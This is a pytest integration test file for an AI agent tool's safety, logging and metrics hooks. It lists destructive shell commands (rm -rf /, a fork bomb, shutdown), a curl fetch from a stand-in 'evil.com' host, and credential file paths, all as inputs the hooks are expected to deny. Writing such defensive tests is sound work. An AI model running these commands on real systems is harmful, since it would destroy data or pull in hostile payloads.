from __future__ import annotations

import asyncio
import logging
import time

import pytest

from maverick.hooks.config import LoggingConfig, SafetyConfig
from maverick.hooks.logging import log_tool_execution
from maverick.hooks.metrics import MetricsCollector, collect_metrics
from maverick.hooks.safety import validate_bash_command, validate_file_write


# T065 [P]: Integration test for safety hooks
# (bash command blocking, file write blocking)
class TestSafetyHooksIntegration:
    """Integration tests for safety hooks with realistic scenarios."""

    @pytest.mark.asyncio
    async def test_bash_command_blocking_dangerous_rm_rf(self) -> None:
        """Test that dangerous rm -rf commands are blocked."""
        config = SafetyConfig(bash_validation_enabled=True)

        # These commands should all be blocked by the dangerous pattern matching
        dangerous_commands = [
            "rm -rf /",  # Deletes root
            "rm -rf ~",  # Deletes home directory
            "rm -rf /*",  # Deletes all files in root
            "rm -r /",  # Deletes root (without -f flag)
            "rm -f -r /",  # Deletes root (flags separated)
        ]

        for cmd in dangerous_commands:
            input_data = {"tool_name": "Bash", "tool_input": {"command": cmd}}
            result = await validate_bash_command(
                input_data, "test-123", None, config=config
            )

            assert "hookSpecificOutput" in result, f"Command '{cmd}' should be blocked"
            hook_output = result["hookSpecificOutput"]
            assert hook_output["permissionDecision"] == "deny", (
                f"Command '{cmd}' should be denied"
            )
            assert hook_output["hookEventName"] == "PreToolUse"
            # blockedPattern should be in the output
            assert (
                "blockedPattern" in hook_output
                or "permissionDecisionReason" in hook_output
            )

    @pytest.mark.asyncio
    async def test_bash_command_blocking_fork_bombs_and_system_commands(self) -> None:
        """Test that fork bombs and system shutdown commands are blocked."""
        config = SafetyConfig(bash_validation_enabled=True)

        dangerous_commands = [
            ":(){ :|:& };:",  # Fork bomb
            "shutdown now",  # System shutdown
            "reboot",  # System reboot
            "halt",  # System halt
        ]

        for cmd in dangerous_commands:
            input_data = {"tool_name": "Bash", "tool_input": {"command": cmd}}
            result = await validate_bash_command(
                input_data, "test-123", None, config=config
            )

            assert "hookSpecificOutput" in result, f"Command '{cmd}' should be blocked"
            assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_bash_command_allows_safe_commands(self) -> None:
        """Test that safe commands are allowed through."""
        config = SafetyConfig(bash_validation_enabled=True)

        safe_commands = [
            "ls -la",
            "git status",
            "echo 'Hello World'",
            "python --version",
            "rm node_modules/package.json",
        ]

        for cmd in safe_commands:
            input_data = {"tool_name": "Bash", "tool_input": {"command": cmd}}
            result = await validate_bash_command(
                input_data, "test-123", None, config=config
            )

            assert result == {}, f"Safe command '{cmd}' should be allowed"

    @pytest.mark.asyncio
    async def test_bash_command_with_custom_blocklist(self) -> None:
        """Test custom blocklist patterns work correctly."""
        config = SafetyConfig(
            bash_validation_enabled=True,
            bash_blocklist=[r"curl.*evil\.com", r"wget.*malware"],
        )

        # Should be blocked by custom pattern
        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://evil.com/payload"},
        }
        result = await validate_bash_command(
            input_data, "test-123", None, config=config
        )
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

        # Should be allowed
        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://google.com"},
        }
        result = await validate_bash_command(
            input_data, "test-123", None, config=config
        )
        assert result == {}

    @pytest.mark.asyncio
    async def test_bash_command_with_allow_override(self) -> None:
        """Test that allow override patterns work correctly."""
        config = SafetyConfig(
            bash_validation_enabled=True, bash_allow_override=[r"rm -rf node_modules"]
        )

        # Should be allowed despite dangerous pattern
        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf node_modules"},
        }
        result = await validate_bash_command(
            input_data, "test-123", None, config=config
        )
        assert result == {}

    @pytest.mark.asyncio
    async def test_file_write_blocking_sensitive_paths(self) -> None:
        """Test that writes to sensitive paths are blocked."""
        config = SafetyConfig(file_write_validation_enabled=True)

        # Use paths that will match the default sensitive_paths patterns
        sensitive_paths = [
            ".env",  # Matches .env pattern
            ".env.production",  # Matches .env.* pattern
            "~/.ssh/id_rsa",  # Matches ~/.ssh/ pattern (will expand ~)
            "~/.aws/credentials",  # Matches ~/.aws/ pattern
            "/etc/passwd",  # Matches /etc/ pattern
            "secrets/api_key.txt",  # Matches secrets/ pattern
        ]

        for path in sensitive_paths:
            input_data = {
                "tool_name": "Write",
                "tool_input": {"file_path": path, "content": "secret data"},
            }
            result = await validate_file_write(
                input_data, "test-123", None, config=config
            )

            assert "hookSpecificOutput" in result, (
                f"Path '{path}' should be blocked (got: {result})"
            )
            hook_output = result["hookSpecificOutput"]
            assert hook_output["permissionDecision"] == "deny", (
                f"Path '{path}' should be denied"
            )

    @pytest.mark.asyncio
    async def test_file_write_allows_safe_paths(self) -> None:
        """Test that writes to safe paths are allowed."""
        config = SafetyConfig(file_write_validation_enabled=True)

        safe_paths = [
            "/workspaces/maverick/src/main.py",
            "/tmp/test.txt",
            "README.md",
            "tests/test_feature.py",
        ]

        for path in safe_paths:
            input_data = {
                "tool_name": "Write",
                "tool_input": {"file_path": path, "content": "safe data"},
            }
            result = await validate_file_write(
                input_data, "test-123", None, config=config
            )

            assert result == {}, f"Safe path '{path}' should be allowed"

    @pytest.mark.asyncio
    async def test_file_write_with_allowlist(self) -> None:
        """Test that allowlist overrides sensitive paths."""
        config = SafetyConfig(
            file_write_validation_enabled=True,
            path_allowlist=[".env.example", ".env.test"],
        )

        # Should be allowed despite .env pattern
        for path in [".env.example", ".env.test"]:
            input_data = {
                "tool_name": "Write",
                "tool_input": {"file_path": path, "content": "safe example"},
            }
            result = await validate_file_write(
                input_data, "test-123", None, config=config
            )
            assert result == {}

    @pytest.mark.asyncio
    async def test_file_write_with_custom_blocklist(self) -> None:
        """Test custom path blocklist patterns."""
        config = SafetyConfig(
            file_write_validation_enabled=True,
            path_blocklist=["/var/log/", "config/production/"],
        )

        # Should be blocked by custom pattern
        input_data = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/var/log/app.log", "content": "data"},
        }
        result = await validate_file_write(input_data, "test-123", None, config=config)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_safety_hooks_can_be_disabled(self) -> None:
        """Test that safety hooks can be disabled via config."""
        config_bash_disabled = SafetyConfig(bash_validation_enabled=False)
        config_file_disabled = SafetyConfig(file_write_validation_enabled=False)

        # Dangerous command should pass when disabled
        input_data = {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}
        result = await validate_bash_command(
            input_data, "test-123", None, config=config_bash_disabled
        )
        assert result == {}

        # Sensitive path should pass when disabled
        input_data = {
            "tool_name": "Write",
            "tool_input": {"file_path": ".env", "content": "data"},
        }
        result = await validate_file_write(
            input_data, "test-123", None, config=config_file_disabled
        )
        assert result == {}


# T066 [P]: Integration test for logging hooks with MetricsCollector
class TestLoggingHooksIntegration:
    """Integration tests for logging hooks with metrics collection."""

    @pytest.mark.asyncio
    async def test_logging_hook_creates_log_entries(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Test that logging hook creates structured log entries."""
        config = LoggingConfig(
            enabled=True, log_level="INFO", output_destination="maverick.hooks.logging"
        )

        with caplog.at_level(logging.INFO, logger="maverick.hooks.logging"):
            input_data = {
                "tool_name": "Bash",
                "tool_input": {"command": "ls -la"},
                "output": "total 100\ndrwxr-xr-x...",
                "status": "success",
            }

            result = await log_tool_execution(
                input_data, "test-456", None, config=config
            )

            # Should return empty dict (no modification to flow)
            assert result == {}

            # Should create log entry
            assert len(caplog.records) > 0
            assert "Tool execution: Bash" in caplog.text
            assert "status=success" in caplog.text

    @pytest.mark.asyncio
    async def test_logging_hook_sanitizes_sensitive_data(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Test that logging hook sanitizes passwords and API keys."""
        config = LoggingConfig(
            enabled=True,
            log_level="DEBUG",
            sanitize_inputs=True,
            output_destination="maverick.hooks.logging",
        )

        with caplog.at_level(logging.DEBUG, logger="maverick.hooks.logging"):
            input_data = {
                "tool_name": "Bash",
                "tool_input": {
                    "command": (
                        "curl -H 'Authorization: Bearer sk-1234567890abcdefghijklmnop'"
                    )
                },
                "output": "success",
                "status": "success",
            }

            await log_tool_execution(input_data, "test-789", None, config=config)

            # Should NOT contain the actual API key
            assert "sk-1234567890abcdefghijklmnop" not in caplog.text
            # Should contain redacted marker
            assert "***" in caplog.text or "REDACTED" in caplog.text

    @pytest.mark.asyncio
    async def test_metrics_collector_records_entries(self) -> None:
        """Test that metrics collector records tool executions."""
        collector = MetricsCollector()

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la"},
            "output": "success",
            "status": "success",
        }

        start_time = time.time()
        result = await collect_metrics(
            input_data, "test-123", None, collector=collector, start_time=start_time
        )

        # Should return empty dict
        assert result == {}

        # Should record entry
        assert collector.entry_count == 1

        # Should have metrics
        metrics = await collector.get_metrics("Bash")
        assert metrics.call_count == 1
        assert metrics.success_count == 1
        assert metrics.failure_count == 0

    @pytest.mark.asyncio
    async def test_metrics_collector_aggregates_multiple_calls(self) -> None:
        """Test that metrics collector aggregates multiple tool calls."""
        collector = MetricsCollector()

        # Record 5 successful calls and 2 failures
        for i in range(5):
            input_data = {"tool_name": "Bash", "status": "success"}
            await collect_metrics(
                input_data,
                f"test-{i}",
                None,
                collector=collector,
                start_time=time.time(),
            )

        for i in range(2):
            input_data = {"tool_name": "Bash", "status": "error"}
            await collect_metrics(
                input_data,
                f"test-fail-{i}",
                None,
                collector=collector,
                start_time=time.time(),
            )

        metrics = await collector.get_metrics("Bash")
        assert metrics.call_count == 7
        assert metrics.success_count == 5
        assert metrics.failure_count == 2
        assert abs(metrics.success_rate - 5 / 7) < 0.01
        assert abs(metrics.failure_rate - 2 / 7) < 0.01

    @pytest.mark.asyncio
    async def test_metrics_collector_tracks_multiple_tools(self) -> None:
        """Test that metrics collector can track different tool types."""
        collector = MetricsCollector()

        # Record calls for different tools
        for tool_name in ["Bash", "Write", "Read", "Edit"]:
            for i in range(3):
                input_data = {"tool_name": tool_name, "status": "success"}
                await collect_metrics(
                    input_data,
                    f"{tool_name}-{i}",
                    None,
                    collector=collector,
                    start_time=time.time(),
                )

        # Total metrics
        all_metrics = await collector.get_metrics(None)
        assert all_metrics.call_count == 12

        # Per-tool metrics
        bash_metrics = await collector.get_metrics("Bash")
        assert bash_metrics.call_count == 3

        write_metrics = await collector.get_metrics("Write")
        assert write_metrics.call_count == 3

    @pytest.mark.asyncio
    async def test_logging_can_be_disabled(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Test that logging can be disabled via config."""
        config = LoggingConfig(enabled=False)

        with caplog.at_level(logging.INFO):
            input_data = {
                "tool_name": "Bash",
                "tool_input": {"command": "ls"},
                "output": "files",
                "status": "success",
            }

            result = await log_tool_execution(
                input_data, "test-123", None, config=config
            )
            assert result == {}

            # Should not create any log entries
            assert len(caplog.records) == 0


# T067: Integration test for combined safety + logging hooks (verify order)
class TestCombinedHooksIntegration:
    """Integration tests for combining safety and logging hooks."""

    @pytest.mark.asyncio
    async def test_safety_blocks_before_logging(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Test that safety hook blocks before logging hook runs.

        When a command is blocked by safety hooks, the tool never executes,
        so PostToolUse (logging) hooks should not record the attempt.
        """
        safety_config = SafetyConfig(bash_validation_enabled=True)

        # Safety hook should block this
        input_data = {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}

        safety_result = await validate_bash_command(
            input_data, "test-123", None, config=safety_config
        )

        # Should be denied
        assert safety_result["hookSpecificOutput"]["permissionDecision"] == "deny"

        # If we were to run logging hook (which shouldn't happen in real flow),
        # it would only see the denied command, not the execution
        # This simulates that the tool execution never happened

        # Logging hook should NOT be called for blocked operations
        # (This is enforced by the SDK - PreToolUse deny prevents PostToolUse)

    @pytest.mark.asyncio
    async def test_safety_allows_then_logging_records(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Test that when safety allows, logging can record the execution."""
        safety_config = SafetyConfig(bash_validation_enabled=True)
        logging_config = LoggingConfig(
            enabled=True, output_destination="maverick.hooks.logging"
        )

        # Safe command should pass safety
        safety_input = {"tool_name": "Bash", "tool_input": {"command": "ls -la"}}

        safety_result = await validate_bash_command(
            safety_input, "test-123", None, config=safety_config
        )
        assert safety_result == {}  # Allowed

        # After tool executes, logging should record it
        with caplog.at_level(logging.INFO, logger="maverick.hooks.logging"):
            logging_input = {
                "tool_name": "Bash",
                "tool_input": {"command": "ls -la"},
                "output": "total 100",
                "status": "success",
            }

            log_result = await log_tool_execution(
                logging_input, "test-123", None, config=logging_config
            )
            assert log_result == {}
            assert "Tool execution: Bash" in caplog.text

    @pytest.mark.asyncio
    async def test_combined_hooks_workflow(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Test a complete workflow with safety, logging, and metrics."""
        safety_config = SafetyConfig(bash_validation_enabled=True)
        logging_config = LoggingConfig(
            enabled=True, output_destination="maverick.hooks.logging"
        )
        collector = MetricsCollector()

        commands = [
            ("ls -la", True),  # Should be allowed
            ("rm -rf /", False),  # Should be blocked
            ("git status", True),  # Should be allowed
        ]

        successful_executions = 0

        with caplog.at_level(logging.INFO, logger="maverick.hooks.logging"):
            for cmd, should_allow in commands:
                # PreToolUse: Safety check
                safety_input = {"tool_name": "Bash", "tool_input": {"command": cmd}}
                safety_result = await validate_bash_command(
                    safety_input, f"test-{cmd}", None, config=safety_config
                )

                if should_allow:
                    assert safety_result == {}, f"Command '{cmd}' should be allowed"

                    # PostToolUse: Logging and metrics (only if allowed)
                    logging_input = {
                        "tool_name": "Bash",
                        "tool_input": {"command": cmd},
                        "output": "output",
                        "status": "success",
                    }

                    await log_tool_execution(
                        logging_input, f"test-{cmd}", None, config=logging_config
                    )
                    await collect_metrics(
                        logging_input,
                        f"test-{cmd}",
                        None,
                        collector=collector,
                        start_time=time.time(),
                    )
                    successful_executions += 1
                else:
                    assert "permissionDecision" in safety_result.get(
                        "hookSpecificOutput", {}
                    ), f"Command '{cmd}' should be blocked"

        # Verify metrics only count successful (allowed) executions
        metrics = await collector.get_metrics("Bash")
        assert metrics.call_count == successful_executions
        assert metrics.call_count == 2  # ls and git, not rm


# T068 [P]: Verify fail-closed behavior with hook exception injection
class TestFailClosedBehavior:
    """Integration tests for fail-closed behavior."""

    @pytest.mark.asyncio
    async def test_bash_validation_fails_closed_on_exception(self) -> None:
        """Test that bash validation blocks operation when exception occurs.

        Note: We can't test with invalid regex in bash_blocklist because Pydantic
        validates it at config creation. Instead, we test with a valid regex that
        causes an exception during matching (e.g., catastrophic backtracking).
        """
        # Test with missing command which should trigger fail-closed
        config = SafetyConfig(bash_validation_enabled=True, fail_closed=True)

        # Missing command field should trigger fail-closed behavior
        input_data = {
            "tool_name": "Bash",
            "tool_input": {},  # No command field
        }

        result = await validate_bash_command(
            input_data, "test-123", None, config=config
        )

        # Should be denied due to missing command (fail-closed)
        assert "hookSpecificOutput" in result
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
        assert (
            "command"
            in result["hookSpecificOutput"]["permissionDecisionReason"].lower()
            or "missing"
            in result["hookSpecificOutput"]["permissionDecisionReason"].lower()
        )

    @pytest.mark.asyncio
    async def test_file_validation_fails_closed_on_exception(self) -> None:
        """Test that file validation blocks operation when exception occurs."""
        config = SafetyConfig(file_write_validation_enabled=True, fail_closed=True)

        # Missing file_path should trigger fail-closed
        input_data = {
            "tool_name": "Write",
            "tool_input": {},  # No file_path
        }

        result = await validate_file_write(input_data, "test-123", None, config=config)

        # Should be denied due to missing path (fail-closed)
        assert "hookSpecificOutput" in result
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_logging_hook_does_not_fail_on_exception(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """Test that logging hook doesn't block flow even if it errors.

        Logging is PostToolUse, so it shouldn't block. It should catch
        exceptions and return empty dict.
        """
        # Use valid config but malformed input data to trigger exception
        config = LoggingConfig(
            enabled=True,
            max_output_length=100,  # Valid value
        )

        # Malformed input that might cause issues during processing
        input_data = {
            "tool_name": None,  # Invalid tool name
            "tool_input": {"command": "ls"},
            "output": None,
            "status": "success",
        }

        # Should not raise exception even with malformed data
        result = await log_tool_execution(input_data, "test-123", None, config=config)
        assert result == {}  # Should gracefully handle errors

    @pytest.mark.asyncio
    async def test_metrics_collection_does_not_fail_on_exception(self) -> None:
        """Test that metrics collection doesn't block flow on exception."""
        collector = MetricsCollector()

        # Invalid input data
        input_data = {
            # Missing tool_name
            "status": "success"
        }

        # Should not raise exception
        result = await collect_metrics(
            input_data, "test-123", None, collector=collector, start_time=time.time()
        )
        assert result == {}


# T069 [P]: Performance test for <10ms hook overhead (SC-004)
class TestHookPerformance:
    """Performance tests for hook execution overhead."""

    @pytest.mark.asyncio
    async def test_safety_hook_performance_under_10ms(self) -> None:
        """Test that safety hook executes in less than 10ms per call."""
        config = SafetyConfig(bash_validation_enabled=True)

        # Test multiple commands
        commands = [
            "ls -la",
            "git status",
            "python --version",
            "echo 'test'",
            "npm install",
        ]

        for cmd in commands:
            input_data = {"tool_name": "Bash", "tool_input": {"command": cmd}}

            start = time.perf_counter()
            await validate_bash_command(input_data, "test-123", None, config=config)
            duration_ms = (time.perf_counter() - start) * 1000

            assert duration_ms < 10.0, (
                f"Hook took {duration_ms:.2f}ms (> 10ms) for command: {cmd}"
            )

    @pytest.mark.asyncio
    async def test_file_write_hook_performance_under_10ms(self) -> None:
        """Test that file write validation executes in less than 10ms per call."""
        config = SafetyConfig(file_write_validation_enabled=True)

        paths = [
            "/workspaces/maverick/src/test.py",
            "/tmp/file.txt",
            "README.md",
            "tests/test_integration.py",
        ]

        for path in paths:
            input_data = {
                "tool_name": "Write",
                "tool_input": {"file_path": path, "content": "test"},
            }

            start = time.perf_counter()
            await validate_file_write(input_data, "test-123", None, config=config)
            duration_ms = (time.perf_counter() - start) * 1000

            assert duration_ms < 10.0, (
                f"Hook took {duration_ms:.2f}ms (> 10ms) for path: {path}"
            )

    @pytest.mark.asyncio
    async def test_logging_hook_performance_under_10ms(self) -> None:
        """Test that logging hook executes in less than 10ms per call."""
        config = LoggingConfig(enabled=True)

        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la"},
            "output": "test output " * 100,  # Moderate output
            "status": "success",
        }

        # Run multiple times to ensure consistency
        for i in range(10):
            start = time.perf_counter()
            await log_tool_execution(input_data, f"test-{i}", None, config=config)
            duration_ms = (time.perf_counter() - start) * 1000

            assert duration_ms < 10.0, (
                f"Hook took {duration_ms:.2f}ms (> 10ms) on iteration {i}"
            )

    @pytest.mark.asyncio
    async def test_metrics_collection_performance_under_10ms(self) -> None:
        """Test that metrics collection executes in less than 10ms per call."""
        collector = MetricsCollector()

        input_data = {"tool_name": "Bash", "status": "success"}

        # Run multiple times to ensure consistency
        for i in range(10):
            start = time.perf_counter()
            await collect_metrics(
                input_data,
                f"test-{i}",
                None,
                collector=collector,
                start_time=time.time(),
            )
            duration_ms = (time.perf_counter() - start) * 1000

            assert duration_ms < 10.0, (
                f"Hook took {duration_ms:.2f}ms (> 10ms) on iteration {i}"
            )

    @pytest.mark.asyncio
    async def test_combined_hooks_performance_under_20ms(self) -> None:
        """Test that combined safety + logging + metrics executes in < 20ms total."""
        safety_config = SafetyConfig(bash_validation_enabled=True)
        logging_config = LoggingConfig(enabled=True)
        collector = MetricsCollector()

        # PreToolUse + PostToolUse simulation
        command = "ls -la"

        start = time.perf_counter()

        # Safety check (PreToolUse)
        safety_input = {"tool_name": "Bash", "tool_input": {"command": command}}
        await validate_bash_command(
            safety_input, "test-123", None, config=safety_config
        )

        # Logging + Metrics (PostToolUse)
        logging_input = {
            "tool_name": "Bash",
            "tool_input": {"command": command},
            "output": "output",
            "status": "success",
        }
        start_exec = time.time()
        await log_tool_execution(
            logging_input,
            "test-123",
            None,
            config=logging_config,
            start_time=start_exec,
        )
        await collect_metrics(
            logging_input, "test-123", None, collector=collector, start_time=start_exec
        )

        total_duration_ms = (time.perf_counter() - start) * 1000

        assert total_duration_ms < 20.0, (
            f"Combined hooks took {total_duration_ms:.2f}ms (> 20ms threshold)"
        )

    @pytest.mark.asyncio
    async def test_concurrent_hook_execution_performance(self) -> None:
        """Test that hooks maintain performance under concurrent execution."""
        safety_config = SafetyConfig(bash_validation_enabled=True)
        collector = MetricsCollector()

        async def execute_hooks(i: int) -> float:
            """Execute a complete hook chain and return duration."""
            start = time.perf_counter()

            input_data = {
                "tool_name": "Bash",
                "tool_input": {"command": f"echo 'test {i}'"},
                "output": f"test {i}",
                "status": "success",
            }

            # Safety check
            await validate_bash_command(
                input_data, f"test-{i}", None, config=safety_config
            )

            # Metrics
            await collect_metrics(
                input_data,
                f"test-{i}",
                None,
                collector=collector,
                start_time=time.time(),
            )

            return (time.perf_counter() - start) * 1000

        # Run 20 concurrent hook executions
        durations = await asyncio.gather(*[execute_hooks(i) for i in range(20)])

        # All should complete in reasonable time
        for i, duration in enumerate(durations):
            assert duration < 20.0, (
                f"Concurrent execution {i} took {duration:.2f}ms (> 20ms)"
            )

        # Average should be well under threshold
        avg_duration = sum(durations) / len(durations)
        assert avg_duration < 15.0, f"Average duration {avg_duration:.2f}ms too high"
